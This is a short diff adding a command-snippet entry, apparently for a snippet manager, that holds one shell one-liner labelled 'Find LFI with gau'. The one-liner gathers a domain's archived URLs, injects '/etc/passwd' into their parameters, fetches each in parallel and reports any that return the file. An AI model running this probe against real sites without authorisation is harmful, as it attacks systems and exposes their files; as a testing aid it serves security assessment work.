@@ -1,0 +1,6 @@
+[[snippets]]
+command = "~/go/bin/gau <domain> | ~/go/bin/gf lfi | ~/go/bin/qsreplace \"/etc/passwd\" | xargs -I % -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"'"
+description = "Find LFI with gau"
+output = ""
+tag = ["hackpet"]
+
